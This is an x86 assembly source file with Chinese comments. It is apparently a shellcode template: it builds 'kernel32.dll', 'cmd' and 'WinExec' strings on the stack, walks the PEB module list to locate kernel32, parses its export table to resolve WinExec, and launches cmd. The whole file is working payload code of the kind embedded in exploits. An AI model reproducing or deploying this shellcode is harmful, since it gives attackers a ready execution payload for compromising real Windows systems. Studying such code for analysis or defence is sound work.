		.386
		.model flat,stdcall
		option casemap:none

		.code
	
start:

		assume fs:nothing
		pushad
		sub esp,40
		
		xor eax,eax
		mov cl,40
		lea edi,[esp]
		rep stosb
														;unicode(kernel32.dll)
		mov byte ptr[esp],6bh					;k
		mov byte ptr[esp+2],65h					;e
		mov byte ptr[esp+4],72h					;r
		mov byte ptr[esp+6],6eh					;n
		mov byte ptr[esp+8],65h					;e
		mov byte ptr[esp+10],6ch				;l
		mov byte ptr[esp+12],33h				;3
		mov byte ptr[esp+14],32h				;2

		mov byte ptr[esp+16],63h				;c
		mov byte ptr[esp+17],6dh				;m
		mov byte ptr[esp+18],64h				;d

		mov dword ptr[esp+20],456e6957h		;WinE
		mov byte ptr[esp+24],78h				;x
		mov byte ptr[esp+25],65h				;e
		mov byte ptr[esp+26],63h				;c


	   mov edx,fs:[eax+30h] 		;PEB
	   mov edx,[edx+0ch] 			;PEB_LDR_DATA
	   add edx,1ch 					;InInitializationOrderModuleList-->LDR_MODULE
	   mov eax,edx						;将双向链表头指针保存,用来结束循环
	   
NextModule:
		xor ecx,ecx
		mov edx,[edx+ecx]				;循环遍历所有节点
		cmp eax,edx						;判断当前的节点指针是否与双向链表头指针相等，相等的话就表示没找到
		je	 GoRet						;循环遍历双向链表都没找到，结束
		mov esi,[edx+20h]   			;获取UNICODE_STRING结构的PWSTR 字符串
		lea edi,[esp]					;堆栈中Kernel32.dll的unicode字符串
		mov cl,16						;Kernel32的字符串长度
		repz cmpsb						;比较是否等于kernel32.dll的unicode串
		test ecx,ecx
		jnz NextModule
		
		;eax -->  IMAGE_DOS_HEADERS
 		mov eax,[edx+8] 				;eax --> LDR_MODULE结构基地址baseAddress,即kernel32.dll的模块基址				
 		mov edx,[edx+8]
		;eax -->  IMAGE_NT_HEADERS		
		add eax,[eax+3Ch]
		;eax -->  IMAGE_EXPORT_DIRECTORY									
		mov eax,[eax+78h]				;OptionalHeader.DataDirectory.VirtualAddress
		add eax,edx
		mov ebx,[eax+20h]				;AddressOfNames
		adc ebx,edx						;ebx指向函数名字符串
		
		mov ecx,[eax+18h]				;NumberOfNames
		
NextFuncName:
		mov edi,[ebx]
		add edi,edx
		lea esi,[esp+20]				;堆栈中的 'WinExec',0
		push ecx
		mov cl,8							;WinExec的字符串长度，包括结尾的0
		repz cmpsb						;比较ES:[ESI]和ES:[EDI]的每一个字符
		test ecx,ecx
		pop ecx
		jz GetFuncAddr					;找到WinExec字符串
		add ebx,4						;每一项RVA占4字节
		loop NextFuncName
		jmp GoRet
		
		
GetFuncAddr:
		sub ebx,edx
		sub ebx,[eax+20h]				;AddressOfNames
		shr ebx,1
		add ebx,[eax+24h]				;AddressOfNameOrdinals
		add ebx,edx
		movzx ecx,WORD ptr [ebx]	;2字节的导出函数序号
		shl ecx,2
		add ecx,[eax+1ch]				;AddressOfFunctions
		add ecx,edx
		mov ecx,[ecx]					;函数RVA	
		add ecx,edx						;函数VA

		;调用WinExec
		lea ebx,[esp+16]				;堆栈中的 	'cmd',0
		push 1							;SW_NORMAL	equ 1
		push ebx
		call ecx
		
GoRet:
		add esp,40
		popad
		
		ret
		end start